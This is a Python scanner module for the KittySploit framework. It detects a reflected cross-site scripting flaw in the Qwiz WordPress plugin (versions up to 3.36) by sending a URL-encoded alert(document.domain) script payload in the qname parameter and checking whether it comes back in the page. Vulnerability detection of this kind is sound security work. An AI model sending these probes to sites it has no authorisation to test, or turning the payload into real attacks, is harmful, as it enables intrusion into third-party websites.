#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The qname, i_qwiz, session_id and username parameters passed to the registration_complete."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Qwiz Online Quizzes And Flashcards <= 3.36 - Cross-Site Scripting Detection',
        'description': 'The qname, i_qwiz, session_id and username parameters passed to the registration_complete.php file are affected by XSS issues.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'wordpress', 'wp-plugin', 'wp', 'wpscan', 'packetstorm', 'qwiz-online-quizzes-and-flashcards', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d3c10f69-87b6-43fd-bcbc-c2d35b683ff4',
            'https://packetstormsecurity.com/files/154403/',
            'https://wordpress.org/plugins/qwiz-online-quizzes-and-flashcards/',
        ],
    }

    def run(self):
        path = '/wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('quizzes/flashcard', '</script><script>alert(document.domain)</script>',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='Qwiz Online Quizzes And Flashcards <= 3.36 - Cross-Site Scripting detected', path=path)
            return True
        return False

